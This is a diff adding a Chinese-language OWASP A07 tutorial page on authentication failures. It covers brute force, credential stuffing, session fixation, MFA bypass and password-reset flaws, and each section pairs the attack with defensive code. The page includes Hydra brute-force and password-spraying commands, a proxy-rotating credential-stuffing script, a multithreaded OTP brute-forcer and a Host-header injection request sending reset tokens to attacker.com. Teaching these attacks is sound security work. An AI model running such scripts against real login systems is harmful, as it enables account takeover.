@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>A07: 认证失效 - OWASP Top 10</title>
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+<div class="page-wrapper">
+  <nav class="sidebar">
+    <h2>OWASP Top 10</h2>
+    <ul>
+      <li><a href="A01_权限控制失效.html">A01: 权限控制失效</a></li>
+      <li><a href="A02_加密机制失效.html">A02: 加密机制失效</a></li>
+      <li><a href="A03_注入攻击.html">A03: 注入攻击</a></li>
+      <li><a href="A04_不安全设计.html">A04: 不安全设计</a></li>
+      <li><a href="A05_安全配置错误.html">A05: 安全配置错误</a></li>
+      <li><a href="A06_过时组件.html">A06: 过时组件</a></li>
+      <li><a href="A07_认证失效.html" class="active">A07: 认证失效</a></li>
+      <li><a href="A08_软件完整性失效.html">A08: 软件完整性失效</a></li>
+      <li><a href="A09_日志监控失效.html">A09: 日志监控失效</a></li>
+      <li><a href="A10_SSRF.html">A10: SSRF</a></li>
+    </ul>
+    <h2>本页目录</h2>
+    <ul>
+      <li><a href="#overview">概述</a></li>
+      <li><a href="#brute-force">暴力破解</a></li>
+      <li><a href="#credential-stuffing">凭证填充</a></li>
+      <li><a href="#weak-passwords">弱密码策略</a></li>
+      <li><a href="#session-mgmt">会话管理</a></li>
+      <li><a href="#mfa-bypass">MFA绕过</a></li>
+      <li><a href="#password-reset">密码重置缺陷</a></li>
+      <li><a href="#defense">防御方案</a></li>
+    </ul>
+    <h2>导航</h2>
+    <ul>
+      <li><a href="../index.html">返回首页</a></li>
+    </ul>
+  </nav>
+
+  <main class="main-content">
+    <div class="breadcrumb">
+      <a href="../index.html">首页</a> / <a href="A01_权限控制失效.html">OWASP Top 10</a> / A07: 认证失效
+    </div>
+
+    <h1>A07:2021 - 身份识别和认证失效</h1>
+    <p><span class="tag high">HIGH</span> <span class="tag">排名第7</span></p>
+    <p>Identification and Authentication Failures（身份识别和认证失效）涵盖了与用户身份验证相关的所有漏洞。当应用无法正确确认用户身份时，攻击者可以冒充任何用户，包括管理员。</p>
+
+    <div class="info-box note">
+      <div class="box-title">认证 vs 授权</div>
+      <p><strong>认证 (Authentication)</strong>：验证"你是谁" — 本章讨论的内容</p>
+      <p><strong>授权 (Authorization)</strong>：验证"你能做什么" — 参见 A01 权限控制失效</p>
+      <p>认证是授权的前提。如果认证环节被绕过，后续的所有权限控制都形同虚设。</p>
+    </div>
+
+    <!-- Section 1 -->
+    <h2 id="overview">1. 概述</h2>
+
+    <h3>1.1 认证失效的常见表现</h3>
+    <table>
+      <thead><tr><th>漏洞类型</th><th>描述</th><th>影响</th></tr></thead>
+      <tbody>
+        <tr><td>暴力破解</td><td>无限次尝试密码不被阻止</td><td>弱密码账户被攻破</td></tr>
+        <tr><td>凭证填充</td><td>使用泄露的密码库自动化尝试</td><td>复用密码的用户被攻破</td></tr>
+        <tr><td>弱密码策略</td><td>允许简单密码如"123456"</td><td>大量用户账户不安全</td></tr>
+        <tr><td>默认凭证</td><td>admin/admin 未修改</td><td>直接获取管理权限</td></tr>
+        <tr><td>会话固定</td><td>登录后未重新生成Session ID</td><td>攻击者劫持会话</td></tr>
+        <tr><td>Session 不失效</td><td>登出后Session仍有效</td><td>泄露的Session可持续利用</td></tr>
+        <tr><td>MFA 缺失/绕过</td><td>关键操作无二次验证</td><td>单因素即可完全控制账户</td></tr>
+        <tr><td>密码明文存储</td><td>不使用哈希存储密码</td><td>数据库泄露=所有密码泄露</td></tr>
+      </tbody>
+    </table>
+
+    <h3>1.2 认证攻击面</h3>
+    <div class="diagram">认证系统的完整攻击面：
+
+┌──────────────────────────────────────────────────────────┐
+│                      认证攻击面                            │
+├──────────────────────────────────────────────────────────┤
+│                                                          │
+│  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌────────────┐ │
+│  │  注册    │  │  登录    │  │  登出    │  │  密码重置   │ │
+│  │         │  │         │  │         │  │            │ │
+│  │ 弱密码   │  │ 暴力破解 │  │ Session │  │ Token可预测│ │
+│  │ 无邮箱验证│  │ 凭证填充 │  │ 未失效   │  │ 逻辑绕过   │ │
+│  │ 枚举用户 │  │ 默认凭证 │  │ Cookie  │  │ 链接泄露   │ │
+│  └─────────┘  └─────────┘  │ 未清理   │  └────────────┘ │
+│                             └─────────┘                  │
+│  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌────────────┐ │
+│  │  MFA    │  │ 记住我   │  │  OAuth  │  │  API认证    │ │
+│  │         │  │         │  │         │  │            │ │
+│  │ 绕过    │  │ Token弱 │  │ 重定向   │  │ API Key泄露│ │
+│  │ 爆破OTP │  │ 不过期   │  │ CSRF    │  │ JWT伪造    │ │
+│  └─────────┘  └─────────┘  └─────────┘  └────────────┘ │
+└──────────────────────────────────────────────────────────┘</div>
+
+    <!-- Section 2 -->
+    <h2 id="brute-force">2. 暴力破解 (Brute Force)</h2>
+
+    <h3>2.1 暴力破解类型</h3>
+    <table>
+      <thead><tr><th>类型</th><th>方法</th><th>速度</th><th>成功率</th></tr></thead>
+      <tbody>
+        <tr><td>简单暴力破解</td><td>尝试所有可能组合 (aaa, aab...)</td><td>极慢</td><td>理论100%</td></tr>
+        <tr><td>字典攻击</td><td>使用常见密码字典</td><td>快</td><td>中（取决于密码强度）</td></tr>
+        <tr><td>混合攻击</td><td>字典+规则变换 (Password→P@ssw0rd)</td><td>中</td><td>较高</td></tr>
+        <tr><td>反向暴力破解</td><td>固定密码，遍历用户名</td><td>快</td><td>对弱密码有效</td></tr>
+        <tr><td>密码喷射</td><td>少量常见密码对大量用户</td><td>快</td><td>对大型组织有效</td></tr>
+      </tbody>
+    </table>
+
+    <h3>2.2 攻击工具与实践</h3>
+    <pre><code># Hydra - 在线密码暴力破解
+
+# HTTP POST 表单暴力破解
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  target.com http-post-form \
+  "/login:username=^USER^&password=^PASS^:Invalid credentials"
+
+# SSH 暴力破解
+hydra -l root -P wordlist.txt ssh://target.com
+
+# 密码喷射（Password Spraying）
+# 对所有用户尝试少量密码，避免触发单用户锁定
+hydra -L users.txt -p "Company2024!" target.com http-post-form \
+  "/login:user=^USER^&pass=^PASS^:Login failed"
+
+# Burp Suite Intruder
+# 1. 捕获登录请求
+# 2. 发送到 Intruder
+# 3. 标记密码字段为 payload position
+# 4. 加载字典 → 开始攻击
+# 5. 根据响应长度/状态码判断成功
+
+# 判断是否存在暴力破解防护
+# - 尝试10次错误登录，观察是否锁定
+# - 观察响应时间是否递增
+# - 观察是否出现 CAPTCHA
+# - 更换IP是否重置计数</code></pre>
+
+    <h3>2.3 密码喷射 (Password Spraying)</h3>
+    <div class="diagram">密码喷射 vs 传统暴力破解：
+
+传统暴力破解（对单个用户试多个密码）：
+  admin → password1 ✗
+  admin → password2 ✗
+  admin → password3 ✗
+  ... (触发账户锁定！)
+
+密码喷射（对多个用户试同一密码）：
+  Round 1: "Company2024!"
+    user001 → Company2024! ✗
+    user002 → Company2024! ✗
+    user003 → Company2024! ✓ ← 成功！
+    ... (每个用户只试1次，不触发锁定)
+
+  等待30分钟（避免检测）
+
+  Round 2: "Welcome1!"
+    user001 → Welcome1! ✗
+    user002 → Welcome1! ✓ ← 成功！
+    ...
+
+常用喷射密码：
+  - 公司名+年份: Company2024!
+  - 季节+年份: Spring2024!
+  - 城市名+数字: Beijing123!
+  - 默认密码: Welcome1!, P@ssw0rd</code></pre>
+
+    <!-- Section 3 -->
+    <h2 id="credential-stuffing">3. 凭证填充 (Credential Stuffing)</h2>
+
+    <h3>3.1 攻击原理</h3>
+    <div class="info-box danger">
+      <div class="box-title">凭证填充的前提条件</div>
+      <p>大量用户在多个网站使用相同密码。当某个网站发生数据泄露后，攻击者获取邮箱+密码组合，然后在其他网站批量尝试登录。</p>
+      <p><strong>成功率</strong>：通常 0.1% - 2%。看似很低，但如果有 100 万条凭证，就能攻破 1000-20000 个账户。</p>
+    </div>
+
+    <pre><code># 凭证填充攻击流程
+
+# 1. 获取泄露数据（暗网/Telegram频道/公开dump）
+# 常见泄露数据库：
+# - Collection #1-5 (数十亿条)
+# - LinkedIn 2021 (7亿条)
+# - Facebook 2021 (5.33亿条)
+
+# 2. 清洗数据，提取 email:password 对
+cat breach_data.txt | sort -u > clean_credentials.txt
+
+# 3. 使用工具批量尝试
+# SentryMBA, OpenBullet, Custom scripts
+
+# Python 凭证填充示例
+import requests
+import concurrent.futures
+
+def try_login(email, password):
+    resp = requests.post('https://target.com/login', json={
+        'email': email,
+        'password': password
+    }, proxies={'https': get_next_proxy()})  # 轮换代理IP
+
+    if resp.status_code == 200 and 'dashboard' in resp.text:
+        return (email, password, True)
+    return (email, password, False)
+
+# 4. 攻击者规避检测的手段：
+# - 使用住宅代理池（看起来是正常用户IP）
+# - 控制请求速率（模拟人类速度）
+# - 随机化 User-Agent
+# - 处理 CAPTCHA（打码平台）
+# - 使用 headless browser（模拟真实浏览器指纹）</code></pre>
+
+    <h3>3.2 检测凭证填充</h3>
+    <pre><code># 凭证填充的检测信号
+
+# 1. 登录失败率异常升高
+# 正常: 5-10% 失败率
+# 攻击: 95%+ 失败率（大量不存在的账户或错误密码）
+
+# 2. 登录来源异常
+# - 大量不同账户从相同IP登录
+# - 来自数据中心/云主机IP的登录
+# - 地理位置异常跳跃
+
+# 3. 行为特征
+# - 极其规律的请求间隔（机器行为）
+# - 无鼠标移动/键盘输入时间
+# - 登录成功后不进行任何操作（只验证凭证有效性）
+
+# 检测规则示例 (伪代码)
+def detect_credential_stuffing(login_events):
+    # 同一IP在1小时内对100+不同账户登录失败
+    ip_failures = group_by_ip(login_events)
+    for ip, events in ip_failures.items():
+        unique_accounts = set(e.username for e in events if not e.success)
+        if len(unique_accounts) > 100:
+            alert(f"Credential stuffing from {ip}: {len(unique_accounts)} accounts")</code></pre>
+
+    <!-- Section 4 -->
+    <h2 id="weak-passwords">4. 弱密码策略</h2>
+
+    <h3>4.1 密码安全存储</h3>
+    <div class="diagram">密码存储演进：
+
+❌ 明文存储:     password → "password123"     (数据库泄露=全部完蛋)
+❌ MD5:          password → "482c811..."       (彩虹表秒破)
+❌ SHA-256:      password → "ef92b7..."        (GPU暴力破解)
+❌ SHA-256+固定盐: password+salt → "a3f2..."   (盐泄露后可批量破解)
+✓  bcrypt:      password → "$2b$12$..." (慢哈希，每个用户独立盐)
+✓  scrypt:      password → (内存密集型，抗GPU/ASIC)
+✓  Argon2id:    password → (最新推荐，内存+时间双重密集)
+
+推荐配置：
+  Argon2id: memory=65536KB, iterations=3, parallelism=4
+  bcrypt:   cost factor=12 (约250ms/次)
+  scrypt:   N=2^15, r=8, p=1</code></pre>
+
+    <h3>4.2 密码策略设计</h3>
+    <pre><code># ✅ 现代密码策略（NIST SP 800-63B 推荐）
+
+# 好的策略：
+# - 最少 8 字符（推荐 12+）
+# - 最大长度至少 64 字符
+# - 允许所有 Unicode 字符（包括空格、中文等）
+# - 检查常见密码黑名单
+# - 检查是否在泄露数据库中（HaveIBeenPwned API）
+# - 不要强制定期更换（除非有证据表明泄露）
+
+# ❌ 过时的策略（反而降低安全性）：
+# - 必须包含大小写+数字+特殊字符 → 导致用户用 P@ssw0rd! 这种模式
+# - 90天强制更换 → 导致 Password1, Password2, Password3...
+# - 禁止粘贴密码 → 阻止密码管理器使用
+
+# Python 密码验证示例
+import hashlib
+import requests
+
+class PasswordValidator:
+    COMMON_PASSWORDS = set(open('10k-common-passwords.txt').read().splitlines())
+
+    def validate(self, password):
+        errors = []
+
+        # 长度检查
+        if len(password) < 8:
+            errors.append("密码至少8个字符")
+        if len(password) > 128:
+            errors.append("密码不能超过128个字符")
+
+        # 常见密码检查
+        if password.lower() in self.COMMON_PASSWORDS:
+            errors.append("密码过于常见")
+
+        # 检查是否在泄露数据库中 (k-anonymity API)
+        if self._check_pwned(password):
+            errors.append("此密码已在数据泄露中出现，请更换")
+
+        return errors
+
+    def _check_pwned(self, password):
+        """使用 HaveIBeenPwned API 检查密码是否泄露"""
+        sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
+        prefix, suffix = sha1[:5], sha1[5:]
+        resp = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}")
+        return suffix in resp.text</code></pre>
+
+    <!-- Section 5 -->
+    <h2 id="session-mgmt">5. 会话管理漏洞</h2>
+
+    <h3>5.1 Session 安全要求</h3>
+    <table>
+      <thead><tr><th>安全要求</th><th>原因</th><th>实现</th></tr></thead>
+      <tbody>
+        <tr><td>Session ID 足够随机</td><td>防止预测/爆破</td><td>至少128bit密码学随机</td></tr>
+        <tr><td>登录后重新生成</td><td>防止 Session Fixation</td><td>login后调用regenerate()</td></tr>
+        <tr><td>HTTPS Only</td><td>防止网络窃听</td><td>Cookie设置Secure标志</td></tr>
+        <tr><td>HttpOnly</td><td>防止XSS窃取</td><td>Cookie设置HttpOnly标志</td></tr>
+        <tr><td>SameSite</td><td>防止CSRF</td><td>Cookie设置SameSite=Strict/Lax</td></tr>
+        <tr><td>合理的过期时间</td><td>减少窗口期</td><td>空闲超时+绝对超时</td></tr>
+        <tr><td>登出即失效</td><td>防止泄露后利用</td><td>服务端删除Session</td></tr>
+        <tr><td>并发登录控制</td><td>检测异常</td><td>同时在线数限制</td></tr>
+      </tbody>
+    </table>
+
+    <h3>5.2 Session Fixation 攻击</h3>
+    <div class="diagram">Session Fixation 攻击流程：
+
+1. 攻击者获取一个有效的 Session ID
+   访问 target.com → 获得 SESSIONID=abc123
+
+2. 攻击者将此 Session ID 固定给受害者
+   发送链接: http://target.com/login?SESSIONID=abc123
+   或通过 XSS: document.cookie = "SESSIONID=abc123"
+
+3. 受害者使用该 Session ID 登录
+   POST /login (Cookie: SESSIONID=abc123)
+   → 登录成功，Session abc123 现在关联了受害者身份
+
+4. 攻击者使用相同 Session ID 访问
+   GET /dashboard (Cookie: SESSIONID=abc123)
+   → 以受害者身份访问！
+
+防御: 登录成功后必须重新生成 Session ID！
+  旧 Session: abc123 (匿名)
+  登录成功后: 销毁 abc123，生成新 def456 (已认证)</div>
+
+    <pre><code># Session 安全配置示例
+
+# Python Flask
+app.config.update(
+    SESSION_COOKIE_SECURE=True,      # 仅HTTPS传输
+    SESSION_COOKIE_HTTPONLY=True,     # 禁止JS访问
+    SESSION_COOKIE_SAMESITE='Lax',   # CSRF防护
+    PERMANENT_SESSION_LIFETIME=1800,  # 30分钟过期
+)
+
+@app.route('/login', methods=['POST'])
+def login():
+    user = authenticate(request.form)
+    if user:
+        # 关键：登录后重新生成 Session ID
+        session.regenerate()
+        session['user_id'] = user.id
+        session['login_time'] = time.time()
+        return redirect('/dashboard')
+
+@app.route('/logout')
+def logout():
+    # 关键：服务端销毁 Session
+    session.clear()
+    response = redirect('/login')
+    response.delete_cookie('session')
+    return response
+
+# Express.js (Node.js)
+app.use(session({
+    secret: crypto.randomBytes(32).toString('hex'),
+    name: '__Host-session',  // Cookie前缀增加安全
+    resave: false,
+    saveUninitialized: false,
+    cookie: {
+        secure: true,
+        httpOnly: true,
+        sameSite: 'strict',
+        maxAge: 30 * 60 * 1000  // 30分钟
+    }
+}));
+
+// 登录后重新生成
+req.session.regenerate((err) => {
+    req.session.userId = user.id;
+});</code></pre>
+
+    <!-- Section 6 -->
+    <h2 id="mfa-bypass">6. MFA 绕过技术</h2>
+
+    <h3>6.1 常见 MFA 绕过方法</h3>
+    <table>
+      <thead><tr><th>绕过方法</th><th>原理</th><th>防御</th></tr></thead>
+      <tbody>
+        <tr><td>OTP 暴力破解</td><td>6位数字只有100万种可能</td><td>限制尝试次数（3-5次）</td></tr>
+        <tr><td>Response 篡改</td><td>修改验证响应从false改为true</td><td>服务端Session控制状态</td></tr>
+        <tr><td>跳过验证步骤</td><td>直接请求验证后的页面</td><td>每个页面检查MFA状态</td></tr>
+        <tr><td>SIM Swap</td><td>社工运营商转移手机号</td><td>使用TOTP替代SMS</td></tr>
+        <tr><td>实时钓鱼</td><td>中间人实时转发OTP</td><td>FIDO2/WebAuthn（抗钓鱼）</td></tr>
+        <tr><td>恢复码滥用</td><td>社工获取备用恢复码</td><td>恢复码单次使用，安全存储</td></tr>
+        <tr><td>Session保持</td><td>"记住设备"功能过度信任</td><td>设备令牌有效期+绑定</td></tr>
+      </tbody>
+    </table>
+
+    <h3>6.2 OTP 暴力破解实例</h3>
+    <pre><code># 场景：6位数字OTP，无速率限制
+
+# 暴力破解6位OTP (000000-999999)
+import requests
+import concurrent.futures
+
+def try_otp(otp_code):
+    resp = requests.post('https://target.com/verify-otp', json={
+        'otp': f'{otp_code:06d}'  # 格式化为6位
+    }, cookies={'session': stolen_session})
+    return resp.status_code == 200
+
+# 并发尝试
+with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+    futures = {executor.submit(try_otp, code): code
+               for code in range(1000000)}
+    for future in concurrent.futures.as_completed(futures):
+        if future.result():
+            print(f"Valid OTP: {futures[future]:06d}")
+            break
+
+# 100万种可能，50并发，每秒100请求 = 约3小时完成
+# 如果OTP 5分钟有效 → 只需尝试约30000次 → 约5分钟
+
+# ✅ 防御
+# 1. 限制OTP尝试次数: 最多3-5次
+# 2. OTP输入错误后延迟递增: 1s, 2s, 4s, 8s...
+# 3. 错误次数过多时锁定并重新发送新OTP
+# 4. 使用8位OTP增加暴力破解难度</code></pre>
+
+    <h3>6.3 实时钓鱼 (Real-time Phishing) 绕过 MFA</h3>
+    <div class="diagram">实时钓鱼攻击绕过 MFA：
+
+受害者                  钓鱼服务器              真实网站
+  │                      │                     │
+  │── 访问钓鱼页面 ──────→│                     │
+  │                      │                     │
+  │←── 返回假登录页 ──────│                     │
+  │                      │                     │
+  │── 输入用户名密码 ────→│── 转发凭证 ─────────→│
+  │                      │                     │
+  │                      │←── 请求OTP ──────────│
+  │←── 显示OTP输入框 ────│                     │
+  │                      │                     │
+  │── 输入OTP ──────────→│── 转发OTP ──────────→│
+  │                      │                     │
+  │                      │←── 返回Session ─────│
+  │←── 显示"成功" ───────│                     │
+  │                      │                     │
+  │  (受害者以为登录成功)    (攻击者获得了有效Session)│
+
+工具: Evilginx2, Modlishka (自动化中间人钓鱼)
+
+唯一防御: FIDO2 / WebAuthn
+  - 硬件密钥(YubiKey)绑定到特定域名
+  - 钓鱼域名 ≠ 真实域名 → 密钥不响应
+  - 即使是实时中间人也无法绕过</div>
+
+    <!-- Section 7 -->
+    <h2 id="password-reset">7. 密码重置缺陷</h2>
+
+    <h3>7.1 常见密码重置漏洞</h3>
+    <pre><code># 漏洞1：可预测的重置Token
+# ❌ 使用时间戳作为token
+reset_token = md5(user.email + str(time.time()))
+# 攻击者知道请求时间 → 可以暴力破解token
+
+# ❌ 使用用户ID作为token
+reset_token = base64(user.id)
+# 直接解码即可伪造
+
+# ✅ 使用密码学安全随机数
+import secrets
+reset_token = secrets.token_urlsafe(32)  # 256bit随机
+
+
+# 漏洞2：Host Header 注入
+# 攻击者发送密码重置请求时修改 Host 头
+POST /forgot-password HTTP/1.1
+Host: attacker.com  # ← 篡改！
+Content-Type: application/json
+{"email": "victim@example.com"}
+
+# 如果后端使用 Host 头构建重置链接：
+reset_link = f"https://{request.host}/reset?token={token}"
+# → 受害者收到: https://attacker.com/reset?token=xxxxx
+# → 点击链接 → Token 发送到攻击者服务器！
+
+# ✅ 防御：硬编码重置链接的域名
+SITE_URL = "https://www.example.com"  # 配置中固定
+reset_link = f"{SITE_URL}/reset?token={token}"
+
+
+# 漏洞3：密码重置Token不过期
+# ❌ Token永久有效
+# 一旦链接泄露（邮件转发、浏览器历史），永远可用
+
+# ✅ Token有效期15-30分钟
+redis.setex(f"reset:{token}", 1800, user.id)  # 30分钟过期
+
+
+# 漏洞4：重置后Token未失效
+# ❌ 使用Token重置密码后，Token仍然可用
+# 攻击者获取旧Token → 再次重置密码
+
+# ✅ 使用后立即删除
+def reset_password(token, new_password):
+    user_id = redis.get(f"reset:{token}")
+    if not user_id:
+        raise InvalidToken()
+    # 重置密码
+    user = User.get(user_id)
+    user.password = hash_password(new_password)
+    # 立即删除Token
+    redis.delete(f"reset:{token}")
+    # 使所有现有Session失效
+    invalidate_all_sessions(user_id)</code></pre>
+
+    <h3>7.2 用户名枚举</h3>
+    <div class="info-box warning">
+      <div class="box-title">通过不同响应枚举有效用户名</div>
+      <p>如果登录失败时返回"用户名不存在"vs"密码错误"，攻击者可以先枚举有效用户名，再针对性爆破。密码重置、注册页面同理。</p>
+    </div>
+
+    <pre><code># ❌ 泄露用户名是否存在
+"该邮箱未注册"  vs  "密码错误"
+→ 攻击者可以判断邮箱是否注册
+
+# ✅ 统一的错误消息
+"用户名或密码错误"  (登录)
+"如果该邮箱已注册，您将收到重置邮件"  (密码重置)
+"注册确认邮件已发送到您的邮箱"  (注册 - 即使已存在也不提示)
+
+# ✅ 统一的响应时间
+# 即使用户不存在，也要花费相同时间处理
+def login(username, password):
+    user = User.query.filter_by(username=username).first()
+    if user is None:
+        # 用户不存在，但仍然执行哈希计算（保持时间一致）
+        bcrypt.checkpw(password.encode(), DUMMY_HASH)
+        return error("Invalid credentials")
+    if not bcrypt.checkpw(password.encode(), user.password_hash):
+        return error("Invalid credentials")
+    return success()</code></pre>
+
+    <!-- Section 8 -->
+    <h2 id="defense">8. 防御方案</h2>
+
+    <h3>8.1 认证安全检查清单</h3>
+    <div class="info-box success">
+      <div class="box-title">认证安全最佳实践</div>
+      <table>
+        <thead><tr><th>类别</th><th>措施</th><th>优先级</th></tr></thead>
+        <tbody>
+          <tr><td>密码存储</td><td>使用 Argon2id/bcrypt，cost factor ≥ 12</td><td>必须</td></tr>
+          <tr><td>暴力破解</td><td>账户锁定 + 渐进延迟 + CAPTCHA</td><td>必须</td></tr>
+          <tr><td>MFA</td><td>关键操作强制二次验证（推荐TOTP/WebAuthn）</td><td>强烈推荐</td></tr>
+          <tr><td>Session</td><td>Secure + HttpOnly + SameSite + 重新生成</td><td>必须</td></tr>
+          <tr><td>密码策略</td><td>最少8字符 + 检查泄露库 + 禁止常见密码</td><td>必须</td></tr>
+          <tr><td>错误消息</td><td>统一消息，不泄露用户存在性</td><td>推荐</td></tr>
+          <tr><td>密码重置</td><td>随机Token + 短有效期 + 单次使用</td><td>必须</td></tr>
+          <tr><td>日志监控</td><td>记录所有认证事件，异常告警</td><td>必须</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>8.2 防暴力破解实现</h3>
+    <pre><code># 多层防暴力破解策略
+
+import time
+from functools import wraps
+
+class BruteForceProtection:
+    """多层暴力破解防御"""
+
+    def __init__(self, redis_client):
+        self.redis = redis_client
+
+    def check_and_record(self, username, ip):
+        """检查是否允许登录尝试"""
+
+        # Layer 1: IP 限制 - 每IP每分钟最多10次
+        ip_key = f"login_attempts:ip:{ip}"
+        ip_attempts = self.redis.incr(ip_key)
+        self.redis.expire(ip_key, 60)
+        if ip_attempts > 10:
+            return False, "请求过于频繁，请稍后再试"
+
+        # Layer 2: 账户限制 - 每账户5次失败后锁定15分钟
+        user_key = f"login_attempts:user:{username}"
+        user_attempts = int(self.redis.get(user_key) or 0)
+        if user_attempts >= 5:
+            ttl = self.redis.ttl(user_key)
+            return False, f"账户已锁定，请{ttl}秒后再试"
+
+        # Layer 3: 全局限制 - 检测分布式攻击
+        global_key = f"login_failures:global:{int(time.time()) // 300}"
+        global_failures = int(self.redis.get(global_key) or 0)
+        if global_failures > 1000:
+            # 触发全局CAPTCHA
+            return False, "CAPTCHA_REQUIRED"
+
+        return True, None
+
+    def record_failure(self, username, ip):
+        """记录失败尝试"""
+        user_key = f"login_attempts:user:{username}"
+        self.redis.incr(user_key)
+        self.redis.expire(user_key, 900)  # 15分钟锁定
+
+        # 渐进延迟
+        attempts = int(self.redis.get(user_key) or 0)
+        delay = min(2 ** attempts, 30)  # 指数递增，最大30秒
+        time.sleep(delay)
+
+    def record_success(self, username, ip):
+        """登录成功，清除计数"""
+        self.redis.delete(f"login_attempts:user:{username}")</code></pre>
+
+    <h3>8.3 现代认证架构推荐</h3>
+    <div class="diagram">现代认证架构：
+
+┌─────────────────────────────────────────────────────┐
+│                 认证安全架构                          │
+├─────────────────────────────────────────────────────┤
+│                                                     │
+│  第一因素 (你知道什么)                                │
+│  ├── 密码 (Argon2id哈希, 检查泄露库)                 │
+│  └── PIN                                           │
+│                                                     │
+│  第二因素 (你拥有什么)                                │
+│  ├── TOTP (Google Authenticator, Authy)            │
+│  ├── FIDO2/WebAuthn (YubiKey, 指纹)  ← 最安全      │
+│  ├── Push通知 (Duo, Microsoft Authenticator)       │
+│  └── SMS/邮箱 OTP (最弱，仅作为备用)                 │
+│                                                     │
+│  风险自适应认证                                      │
+│  ├── 正常登录: 密码 + 记住设备                       │
+│  ├── 异常登录: 密码 + MFA + 额外验证                 │
+│  │   (新设备/新IP/异常时间/异常地点)                  │
+│  └── 高风险操作: 重新认证 + MFA                      │
+│      (转账/修改密码/修改邮箱)                         │
+│                                                     │
+│  会话管理                                           │
+│  ├── 短期 Access Token (15min)                     │
+│  ├── 长期 Refresh Token (7天, 可撤销)               │
+│  └── 设备绑定 + 异常检测                            │
+└─────────────────────────────────────────────────────┘</div>
+
+    <div class="nav-footer">
+      <a href="A06_过时组件.html">&larr; A06: 过时组件</a>
+      <a href="A08_软件完整性失效.html">A08: 软件完整性失效 &rarr;</a>
+    </div>
+  </main>
+</div>
+</body>
+</html>
